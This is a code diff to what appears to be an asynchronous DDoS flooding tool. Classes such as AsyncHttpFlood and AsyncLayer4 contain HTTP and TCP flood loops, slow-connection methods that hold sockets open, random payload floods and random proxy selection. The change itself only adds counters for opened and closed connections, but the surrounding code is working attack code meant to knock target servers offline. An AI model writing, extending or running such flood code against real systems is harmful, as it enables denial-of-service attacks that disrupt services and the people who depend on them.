@@ -922,12 +922,11 @@ class AsyncHttpFlood(HttpFlood):
         return reader, writer
 
     # XXX: config for timeouts
-    # XXX: with async generators the attack itself could be defined
-    #      independently from I/O operations
     async def _generic_flood(self, payload: bytes, *, rpc: Optional[int] = None) -> int:
         rpc = rpc or self._rpc
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        self._stats.track_open_connection()
         try:
             for _ in range(rpc):
                 writer.write(payload)
@@ -936,6 +935,8 @@ class AsyncHttpFlood(HttpFlood):
                 packets_sent += 1
         finally:
             writer.close()
+            # XXX: i'm curious if there's a way to add "on_close" callback or something
+            self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
@@ -1040,6 +1041,7 @@ class AsyncHttpFlood(HttpFlood):
         connector = self._proxies.pick_random_connector() if self._proxies else None
         packets_sent = 0
         async with aiohttp.ClientSession(connector=connector) as s:
+            self._stats.track_open_connection() # not exactly the connection though
             for _ in range(self._rpc):
                 async with s.get(self._target.human_repr()) as response:
                     # XXX: this could be optimized by reading chunks
@@ -1054,6 +1056,7 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        self._stats.track_open_connection()
         try:
             writer.write(payload)
             await asyncio.wait_for(writer.drain(), timeout=1)
@@ -1069,6 +1072,7 @@ class AsyncHttpFlood(HttpFlood):
                 if time() > ts + 120: break
         finally:
             writer.close()
+            self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
@@ -1077,6 +1081,7 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
                 writer.write(payload)
@@ -1086,6 +1091,7 @@ class AsyncHttpFlood(HttpFlood):
                 await asyncio.wait_for(reader.read(1), timeout=1)
         finally:
             writer.close()
+            self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
@@ -1098,6 +1104,7 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
                 await asyncio.sleep(max(self._rpc / 1000, 1))
@@ -1107,6 +1114,7 @@ class AsyncHttpFlood(HttpFlood):
                 self._stats.track(1, packet_size)
         finally:
             writer.close()
+            self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
@@ -1115,6 +1123,7 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
                 writer.write(payload)
@@ -1135,6 +1144,7 @@ class AsyncHttpFlood(HttpFlood):
                     await asyncio.sleep(self._rpc / 15)
         finally:
             writer.close()
+            self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
@@ -1144,6 +1154,7 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
                 writer.write(payload)
@@ -1158,6 +1169,7 @@ class AsyncHttpFlood(HttpFlood):
                 await asyncio.wait_for(writer.drain(), timeout=1)
         finally:
             writer.close()
+            self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
@@ -1193,6 +1205,7 @@ class AsyncLayer4(Layer4):
     async def TCP(self) -> int:
         packets_sent, packet_size = 0, 1024
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        self._stats.track_open_connection()
         try:
             for _ in range(self._rpc):
                 payload: bytes = randbytes(packet_size)
@@ -1202,6 +1215,7 @@ class AsyncLayer4(Layer4):
                 packets_sent += 1
         finally:
             writer.close()
+            self._stats.track_close_connection()
             await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
